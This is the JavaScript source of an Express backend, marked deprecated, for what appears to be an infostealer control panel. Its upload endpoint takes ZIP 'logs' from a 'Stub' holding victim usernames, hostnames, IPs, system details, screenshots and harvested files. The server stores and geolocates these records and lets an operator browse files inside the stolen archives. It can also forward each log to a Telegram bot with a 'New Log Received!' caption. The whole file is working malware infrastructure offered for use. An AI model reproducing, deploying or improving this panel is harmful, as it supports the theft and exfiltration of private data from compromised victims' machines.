// ⚠️ DEPRECATED: This Express backend is legacy. Active panel backend runs via Flask (app.py / start.py).
const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const sqlite3 = require('sqlite3');
const { open } = require('sqlite');
const AdmZip = require('adm-zip');
const axios = require('axios'); // For Telegram forwarding if needed
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const SECRET_KEY = process.env.SECRET_KEY || 'aesthetic_secret_key_123';

// Directories setup
const UPLOADS_DIR = path.join(__dirname, 'public', 'uploads');
const LOGS_DIR = path.join(UPLOADS_DIR, 'logs');
const SCREENSHOTS_DIR = path.join(UPLOADS_DIR, 'screenshots');

[LOGS_DIR, SCREENSHOTS_DIR].forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
});

// Middleware
app.use(express.json());
app.use((req, res, next) => {
    if (req.path.endsWith('.js') || req.path.endsWith('.css') || req.path.endsWith('.html') || req.path === '/') {
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
        res.setHeader('Pragma', 'no-cache');
    }
    next();
});
app.use(express.static(path.join(__dirname, 'public')));

// Configure Multer for file uploads
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, LOGS_DIR);
    },
    filename: (req, file, cb) => {
        // Use a unique name with timestamp
        const ext = path.extname(file.originalname) || '.zip';
        const basename = path.basename(file.originalname, ext);
        cb(null, `${basename}_${Date.now()}${ext}`);
    }
});
const upload = multer({ storage });

const bgStorage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, UPLOADS_DIR);
    },
    filename: (req, file, cb) => {
        const ext = path.extname(file.originalname) || '.jpg';
        cb(null, `custom_bg_${Date.now()}${ext}`);
    }
});
const uploadBg = multer({ storage: bgStorage });

let db;

// Initialize Database
async function initDb() {
    db = await open({
        filename: path.join(__dirname, 'database.db'),
        driver: sqlite3.Database
    });

    await db.exec(`
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            hostname TEXT,
            os TEXT,
            cpu TEXT,
            ram INTEGER,
            ip TEXT,
            date_time TEXT,
            file_count INTEGER,
            zip_filename TEXT,
            has_screenshot INTEGER,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        );
    `);

    // Check if country_code column exists, if not, add it
    const columns = await db.all("PRAGMA table_info(logs)");
    const hasCountryCode = columns.some(c => c.name === 'country_code');
    if (!hasCountryCode) {
        await db.exec("ALTER TABLE logs ADD COLUMN country_code TEXT");
    }

    // Insert default settings
    await db.run('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', ['tg_forward_enabled', 'false']);
    await db.run('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', ['tg_bot_token', '']);
    await db.run('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', ['tg_chat_id', '']);
}

// Helper to parse Information.txt
function parseInfoText(text) {
    const info = {
        username: 'Unknown',
        hostname: 'Unknown',
        os: 'Unknown',
        cpu: 'Unknown',
        ram: 0,
        ip: 'Unknown',
        date_time: ''
    };

    const lines = text.split('\n');
    lines.forEach(line => {
        if (line.startsWith('User: ')) {
            info.username = line.substring(6).trim();
        } else if (line.startsWith('Machine: ')) {
            info.hostname = line.substring(9).trim();
        } else if (line.startsWith('OS: ')) {
            info.os = line.substring(4).trim();
        } else if (line.startsWith('CPU Name: ')) {
            info.cpu = line.substring(10).trim();
        } else if (line.startsWith('RAM Total (MB): ')) {
            info.ram = parseInt(line.substring(16).trim()) || 0;
        } else if (line.startsWith('Internal IP: ')) {
            const val = line.substring(13).trim();
            if (['Unknown', 'unavailable', '127.0.0.1', '::1'].includes(info.ip)) {
                info.ip = val;
            }
        } else if (line.startsWith('IP: ')) {
            info.ip = line.substring(4).trim();
        } else if (line.startsWith('Now: ')) {
            info.date_time = line.substring(5).trim();
        }
    });

    return info;
}

async function getCountryCode(ip) {
    if (!ip || ['127.0.0.1', '::1', 'Unknown', 'unavailable'].includes(ip)) {
        return '';
    }
    try {
        const res = await axios.get(`https://ip2c.org/${ip}`, { timeout: 3000 });
        if (res.status === 200 && typeof res.data === 'string') {
            const parts = res.data.split(';');
            if (parts.length >= 2 && parts[0] === '1') {
                return parts[1]; // e.g. "US"
            }
        }
    } catch (err) {
        console.error('[GeoIP] Error:', err.message);
    }
    return '';
}

// Forward to Telegram helper
async function forwardToTelegram(filePath, filename, info) {
    try {
        const enabled = await db.get('SELECT value FROM settings WHERE key = ?', ['tg_forward_enabled']);
        if (!enabled || enabled.value !== 'true') return;

        const tokenRow = await db.get('SELECT value FROM settings WHERE key = ?', ['tg_bot_token']);
        const chatRow = await db.get('SELECT value FROM settings WHERE key = ?', ['tg_chat_id']);

        if (!tokenRow || !tokenRow.value || !chatRow || !chatRow.value) return;

        const botToken = tokenRow.value;
        const chatId = chatRow.value;

        // Send text notification
        const ramStr = info.ram >= 1024 ? Math.round(info.ram / 1024) + ' GB' : (info.ram > 0 ? info.ram + ' MB' : 'Unknown');
        const caption = `👑 <b>New Log Received!</b>\n\n` +
                        `👤 <b>User:</b> ${info.username}\n` +
                        `💻 <b>Machine:</b> ${info.hostname}\n` +
                        `🌐 <b>IP:</b> ${info.ip}\n` +
                        `🖥️ <b>OS:</b> ${info.os}\n` +
                        `💾 <b>RAM:</b> ${ramStr}\n` +
                        `⏱️ <b>Time:</b> ${info.date_time || new Date().toISOString()}`;

        const FormData = require('form-data');
        const form = new FormData();
        form.append('chat_id', chatId);
        form.append('caption', caption);
        form.append('parse_mode', 'HTML');
        form.append('document', fs.createReadStream(filePath), filename);

        await axios.post(`https://api.telegram.org/bot${botToken}/sendDocument`, form, {
            headers: form.getHeaders(),
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        console.log('[TG Forward] Successfully forwarded log to Telegram');
    } catch (err) {
        console.error('[TG Forward] Error forwarding to Telegram:', err.message);
    }
}

// API: Upload log from Stub
app.post('/api/upload', upload.single('document'), async (req, res) => {
    try {
        // Authenticate request using header
        const secret = req.headers['x-panel-key'] || req.body['secret_key'];
        if (SECRET_KEY && secret !== SECRET_KEY) {
            if (req.file) {
                fs.unlinkSync(req.file.path);
            }
            return res.status(403).json({ error: 'Unauthorized secret key' });
        }

        if (!req.file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }

        console.log(`[API] Received file: ${req.file.filename}`);

        // Parse ZIP content
        const zipPath = req.file.path;
        const zip = new AdmZip(zipPath);
        const zipEntries = zip.getEntries();
        const fileCount = zipEntries.length;

        let info = {
            username: 'Unknown',
            hostname: 'Unknown',
            os: 'Unknown',
            cpu: 'Unknown',
            ram: 0,
            ip: req.ip || 'Unknown',
            date_time: new Date().toISOString()
        };
        let hasScreenshot = 0;

        // Extract and process Information.txt
        const infoEntry = zipEntries.find(e => e.entryName === 'Information.txt');
        if (infoEntry) {
            const infoText = infoEntry.getData().toString('utf8');
            info = parseInfoText(infoText);
            // Fallback to connection IP if local IP is generic
            if (info.ip === 'unavailable' || info.ip === '127.0.0.1' || info.ip === '::1') {
                info.ip = req.ip.replace('::ffff:', '') || 'Unknown';
            }
        }

        // Extract screenshot.jpg to public screenshots directory
        const screenshotEntry = zipEntries.find(e => e.entryName === 'screenshot.jpg');
        if (screenshotEntry) {
            const screenshotData = screenshotEntry.getData();
            const screenshotFilename = `${path.basename(req.file.filename, '.zip')}.jpg`;
            fs.writeFileSync(path.join(SCREENSHOTS_DIR, screenshotFilename), screenshotData);
            hasScreenshot = 1;
        }

        // Resolve country code
        const countryCode = await getCountryCode(info.ip);

        // Save to Database
        const result = await db.run(`
            INSERT INTO logs (username, hostname, os, cpu, ram, ip, date_time, file_count, zip_filename, has_screenshot, country_code)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        `, [
            info.username,
            info.hostname,
            info.os,
            info.cpu,
            info.ram,
            info.ip,
            info.date_time,
            fileCount,
            req.file.filename,
            hasScreenshot,
            countryCode
        ]);

        console.log(`[API] Log saved with ID: ${result.lastID}`);

        // Forward to Telegram bot in background
        forwardToTelegram(zipPath, req.file.filename, info);

        return res.status(200).json({ success: true, id: result.lastID });
    } catch (err) {
        console.error('[API] Upload processing error:', err);
        return res.status(500).json({ error: 'Internal Server Error' });
    }
});

// API: Get Logs List
app.get('/api/logs', async (req, res) => {
    try {
        const page = parseInt(req.query.page) || 1;
        const limit = parseInt(req.query.limit) || 15;
        const offset = (page - 1) * limit;
        const search = req.query.search || '';

        let query = 'SELECT * FROM logs';
        let countQuery = 'SELECT COUNT(*) as count FROM logs';
        let params = [];

        if (search) {
            const likeExpr = `%${search}%`;
            query += ' WHERE username LIKE ? OR hostname LIKE ? OR os LIKE ? OR ip LIKE ?';
            countQuery += ' WHERE username LIKE ? OR hostname LIKE ? OR os LIKE ? OR ip LIKE ?';
            params = [likeExpr, likeExpr, likeExpr, likeExpr];
        }

        query += ' ORDER BY id DESC LIMIT ? OFFSET ?';
        
        const logs = await db.all(query, [...params, limit, offset]);
        const totalRow = await db.get(countQuery, params);
        const total = totalRow ? totalRow.count : 0;

        res.json({
            logs,
            total,
            page,
            totalPages: Math.ceil(total / limit)
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// API: Get Log Details (also serves file content when ?file= is provided)
app.get('/api/logs/:id', async (req, res) => {
    console.log(`[LOGS/:id] id=${req.params.id} query=${JSON.stringify(req.query)} file=${req.query.file}`);
    try {
        const log = await db.get('SELECT * FROM logs WHERE id = ?', [req.params.id]);
        if (!log) return res.status(404).json({ error: 'Log not found' });

        const zipPath = path.join(LOGS_DIR, log.zip_filename);
        if (!fs.existsSync(zipPath)) {
            return res.status(404).json({ error: 'Zip file not found' });
        }

        const filePath = req.query.file;

        // If ?file= param provided, return file content from zip
        if (filePath) {
            let zip;
            try {
                zip = new AdmZip(zipPath);
            } catch (e) {
                return res.status(500).json({ error: 'Failed to open archive' });
            }

            const normalized = filePath.replace(/\\/g, '/').replace(/^\/+/, '');
            const entries = zip.getEntries();

            let entry = null;
            for (const e of entries) {
                const en = e.entryName.replace(/\\/g, '/').replace(/^\/+/, '');
                if (en === normalized || e.entryName === filePath) {
                    entry = e;
                    break;
                }
            }

            if (!entry) {
                return res.status(404).json({ error: 'File not found in archive', path: normalized });
            }

            let data;
            try {
                data = entry.getData();
            } catch (e) {
                return res.status(500).json({ error: 'Failed to extract file from archive' });
            }

            const ext = path.extname(filePath).toLowerCase();
            const textExts = ['.txt', '.json', '.csv', '.xml', '.html', '.htm', '.js', '.css',
                '.log', '.ini', '.cfg', '.conf', '.yaml', '.yml', '.toml', '.md', '.sql', '.py',
                '.sh', '.bat', '.cmd', '.ps1', '.env', '.gitignore', '.editorconfig', ''];
            const binaryExts = ['.exe', '.dll', '.bin', '.dat', '.zip', '.rar', '.7z', '.gz', '.tar',
                '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.ico', '.mp3', '.mp4', '.avi', '.mov',
                '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.pdb', '.obj', '.lib', '.so', '.dylib',
                '.node', '.wasm', '.db', '.sqlite', '.ldb', '.log-journal', '.db-journal', '.db-wal', '.db-shm'];

            const isBinary = textExts.includes(ext) ? false : (binaryExts.includes(ext) || data.includes(0x00));

            if (isBinary) {
                return res.json({ type: 'binary', filename: path.basename(filePath), size: data.length });
            }

            let content = data.toString('utf8');
            content = content.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F]/g, '');
            content = content.replace(/[\uD800-\uDFFF]/g, '�');

            if (content.length > 1024 * 1024) {
                content = content.substring(0, 1024 * 1024) + '\n\n--- truncated ---';
            }

            try {
                const jsonStr = JSON.stringify({ type: 'text', filename: path.basename(filePath), content });
                res.setHeader('Content-Type', 'application/json; charset=utf-8');
                return res.end(jsonStr);
            } catch (jsonErr) {
                // Fallback: sanitize harder and retry
                const safe = content.replace(/[^\x20-\x7E\r\n\t -￿]/g, '');
                try {
                    const jsonStr2 = JSON.stringify({ type: 'text', filename: path.basename(filePath), content: safe });
                    res.setHeader('Content-Type', 'application/json; charset=utf-8');
                    return res.end(jsonStr2);
                } catch (e2) {
                    return res.status(500).json({ error: 'File content cannot be displayed' });
                }
            }
        }

        // Default: return log details with file list
        const zip = new AdmZip(zipPath);
        const files = zip.getEntries()
            .filter(e => !e.isDirectory)
            .map(e => ({
                name: e.entryName,
                size: e.header.size
            }));

        res.json({ log, files, _v: 2 });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// API: Delete Log
app.delete('/api/logs/:id', async (req, res) => {
    try {
        const log = await db.get('SELECT * FROM logs WHERE id = ?', [req.params.id]);
        if (!log) return res.status(404).json({ error: 'Log not found' });

        // Delete zip
        const zipPath = path.join(LOGS_DIR, log.zip_filename);
        if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);

        // Delete screenshot
        if (log.has_screenshot) {
            const screenshotFilename = `${path.basename(log.zip_filename, '.zip')}.jpg`;
            const screenshotPath = path.join(SCREENSHOTS_DIR, screenshotFilename);
            if (fs.existsSync(screenshotPath)) fs.unlinkSync(screenshotPath);
        }

        // Delete from database
        await db.run('DELETE FROM logs WHERE id = ?', [req.params.id]);

        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// API: Download Log ZIP
app.get('/api/logs/:id/download', async (req, res) => {
    try {
        const log = await db.get('SELECT * FROM logs WHERE id = ?', [req.params.id]);
        if (!log) return res.status(404).send('Log not found');

        const zipPath = path.join(LOGS_DIR, log.zip_filename);
        if (!fs.existsSync(zipPath)) {
            return res.status(404).send('Zip file not found');
        }

        res.download(zipPath, log.zip_filename);
    } catch (err) {
        res.status(500).send(err.message);
    }
});

// API: Get Stats
app.get('/api/stats', async (req, res) => {
    try {
        const totalLogs = await db.get('SELECT COUNT(*) as count FROM logs');
        
        // Logs today
        const todayStr = new Date().toISOString().split('T')[0] + '%';
        const logsToday = await db.get("SELECT COUNT(*) as count FROM logs WHERE created_at LIKE ?", [todayStr]);

        // Unique IPs
        const uniqueIps = await db.get('SELECT COUNT(DISTINCT ip) as count FROM logs');

        // OS Breakdown
        const osStats = await db.all('SELECT os, COUNT(*) as count FROM logs GROUP BY os ORDER BY count DESC LIMIT 5');

        res.json({
            totalLogs: totalLogs ? totalLogs.count : 0,
            logsToday: logsToday ? logsToday.count : 0,
            uniqueIps: uniqueIps ? uniqueIps.count : 0,
            osStats
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// API: Get Settings
app.get('/api/settings', async (req, res) => {
    try {
        const rows = await db.all('SELECT * FROM settings');
        const settings = {};
        rows.forEach(r => {
            settings[r.key] = r.value;
        });
        res.json(settings);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// API: Save Settings
app.post('/api/settings', async (req, res) => {
    try {
        const { tg_forward_enabled, tg_bot_token, tg_chat_id, active_bg_theme, bg_blur_value, custom_bg_path } = req.body;
        
        if (tg_forward_enabled !== undefined) {
            await db.run('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ['tg_forward_enabled', String(tg_forward_enabled)]);
        }
        if (tg_bot_token !== undefined) {
            await db.run('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ['tg_bot_token', tg_bot_token]);
        }
        if (tg_chat_id !== undefined) {
            await db.run('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ['tg_chat_id', tg_chat_id]);
        }
        if (active_bg_theme !== undefined) {
            await db.run('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ['active_bg_theme', active_bg_theme]);
        }
        if (bg_blur_value !== undefined) {
            await db.run('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ['bg_blur_value', String(bg_blur_value)]);
        }
        if (custom_bg_path !== undefined) {
            await db.run('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ['custom_bg_path', custom_bg_path]);
        }

        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// API: Upload Custom Background Image
app.post('/api/settings/background', uploadBg.single('background'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }
        
        const db_path_url = `/uploads/${req.file.filename}`;
        
        await db.run('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ['custom_bg_path', db_path_url]);
        await db.run('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ['active_bg_theme', 'theme-custom']);
        
        res.json({
            success: true,
            custom_bg_path: db_path_url
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Catch-all: return JSON for any unmatched route or error
app.use((req, res) => {
    res.status(404).json({ error: 'Not found', url: req.originalUrl });
});

app.use((err, req, res, next) => {
    console.error('[ERROR]', err.message);
    res.status(500).json({ error: err.message });
});

// Start Server
initDb().then(() => {
    app.listen(PORT, () => {
        console.log(`[SERVER] Aesthetic Web Panel running on port ${PORT}`);
        console.log(`[SERVER] Secret key: ${SECRET_KEY}`);
    });
});
